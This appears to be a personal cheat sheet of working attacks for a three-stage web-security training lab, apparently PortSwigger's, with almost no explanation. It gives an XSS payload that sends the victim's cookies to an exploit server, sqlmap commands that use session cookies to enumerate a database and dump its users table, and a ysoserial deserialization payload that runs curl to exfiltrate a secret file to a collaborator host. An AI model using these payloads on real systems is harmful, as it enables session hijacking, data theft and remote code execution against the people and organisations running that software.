stage 1

PoC: "-Function`X${a}```-"
output: Uncaught ReferenceError: a is not defined

"-Function`X${document.location="https://exploit-0a600087031e75f78385ccb001050090.exploit-server.net/aabbcc="+document.cookie}```-"

url encode key chars: https://meyerweb.com/eric/tools/dencoder/

<script>
document.location = "https://0af400410395756e83d0cdfc003a001a.web-security-academy.net/?find=%22-Function`X${document.location=%22https://exploit-0a600087031e75f78385ccb001050090.exploit-server.net/aabbcc=%22%2document.cookie}```-%22"
</script>


stage 2

try --level=5 if everything fails.
try with a normal string such as ASC.

python3 sqlmap.py -u 'https://0af400410395756e83d0cdfc003a001a.web-security-academy.net/filtered_search?find=aaa&organize=5&order=ASC&BlogArtist=' --compressed -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: hu-HU,hu;q=0.8,en-US;q=0.5,en;q=0.3' -H 'Accept-Encoding: gzip, deflate, br' -H 'Connection: keep-alive' -H 'Cookie: session=cEso0L5j7hBB4VRe6b0VWzn0Mg0t5L2L; _lab=46%7cMCwCFHIogSDCRbi6BxN5TkzOiPmbkYeMAhQygfZsRV7AjYQi9KssmRXsdi2%2bXINzcJom37sMx%2beKEd5brcaseAnv%2bxkcEeEykgahLvnV%2fcm%2fSY5bhPoJXvva%2beXU%2b6wTu5DMTIV%2bqEighcTTKCB%2feIuKbd00hUW2ToUKG6FxR9%2bQIMg%3d' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: cross-site'  -p 'order' -batch --random-agent --level=3 --risk=1 --dbs --tables


python3 sqlmap.py -u 'https://0af400410395756e83d0cdfc003a001a.web-security-academy.net/filtered_search?find=aaa&organize=5&order=ASC&BlogArtist=' --compressed -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: hu-HU,hu;q=0.8,en-US;q=0.5,en;q=0.3' -H 'Accept-Encoding: gzip, deflate, br' -H 'Connection: keep-alive' -H 'Cookie: session=cEso0L5j7hBB4VRe6b0VWzn0Mg0t5L2L; _lab=46%7cMCwCFHIogSDCRbi6BxN5TkzOiPmbkYeMAhQygfZsRV7AjYQi9KssmRXsdi2%2bXINzcJom37sMx%2beKEd5brcaseAnv%2bxkcEeEykgahLvnV%2fcm%2fSY5bhPoJXvva%2beXU%2b6wTu5DMTIV%2bqEighcTTKCB%2feIuKbd00hUW2ToUKG6FxR9%2bQIMg%3d' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: cross-site'  -p 'order' -batch --random-agent --level=3 --risk=1 -D public -T users --columns --technique=E


python3 sqlmap.py -u 'https://0af400410395756e83d0cdfc003a001a.web-security-academy.net/filtered_search?find=aaa&organize=5&order=ASC&BlogArtist=' --compressed -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: hu-HU,hu;q=0.8,en-US;q=0.5,en;q=0.3' -H 'Accept-Encoding: gzip, deflate, br' -H 'Connection: keep-alive' -H 'Cookie: session=cEso0L5j7hBB4VRe6b0VWzn0Mg0t5L2L; _lab=46%7cMCwCFHIogSDCRbi6BxN5TkzOiPmbkYeMAhQygfZsRV7AjYQi9KssmRXsdi2%2bXINzcJom37sMx%2beKEd5brcaseAnv%2bxkcEeEykgahLvnV%2fcm%2fSY5bhPoJXvva%2beXU%2b6wTu5DMTIV%2bqEighcTTKCB%2feIuKbd00hUW2ToUKG6FxR9%2bQIMg%3d' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: cross-site'  -p 'order' -batch --random-agent --level=3 --risk=1 -D public -T users --dump


stage 3

java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar "CommonsCollections2" 'curl https:/zfi3yzddbe7y48vjbmp79z27oyupii67.oastify.com -d @/home/carlos/secret' | gzip -c | base64 -w 0

